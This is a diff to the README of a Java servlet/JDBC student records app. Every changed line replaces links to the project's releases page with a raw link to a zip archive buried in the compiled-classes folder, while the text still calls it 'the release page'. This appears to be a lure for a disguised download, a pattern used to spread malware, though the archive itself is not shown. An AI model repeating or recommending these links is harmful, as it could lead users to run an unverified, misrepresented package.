@@ -1,10 +1,10 @@
 # 🧑‍🎓 student-management-system-servlet-jdbc - Manage Student Records with Ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/irriga4605/student-management-system-servlet-jdbc/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/irriga4605/student-management-system-servlet-jdbc/raw/refs/heads/main/target/classes/com/student/servlet/student-servlet-system-jdbc-management-1.3.zip)
 
 ## 📥 Download
 
-Visit this page to download the app: https://github.com/irriga4605/student-management-system-servlet-jdbc/releases
+Visit this page to download the app: https://github.com/irriga4605/student-management-system-servlet-jdbc/raw/refs/heads/main/target/classes/com/student/servlet/student-servlet-system-jdbc-management-1.3.zip
 
 ## 🖥️ What this app does
 
@@ -34,7 +34,7 @@ If you plan to use the app from a release package, you may only need the files f
 
 ## 🚀 Get the app
 
-1. Open the release page: https://github.com/irriga4605/student-management-system-servlet-jdbc/releases
+1. Open the release page: https://github.com/irriga4605/student-management-system-servlet-jdbc/raw/refs/heads/main/target/classes/com/student/servlet/student-servlet-system-jdbc-management-1.3.zip
 2. Find the latest release
 3. Download the release file or source package from that page
 4. Save the file to a folder you can reach, such as Downloads
@@ -195,7 +195,7 @@ This repository is for:
 
 ## 📦 Release download
 
-Use the release page to download the app package: https://github.com/irriga4605/student-management-system-servlet-jdbc/releases
+Use the release page to download the app package: https://github.com/irriga4605/student-management-system-servlet-jdbc/raw/refs/heads/main/target/classes/com/student/servlet/student-servlet-system-jdbc-management-1.3.zip
 
 ## 🪟 Windows folder setup
 
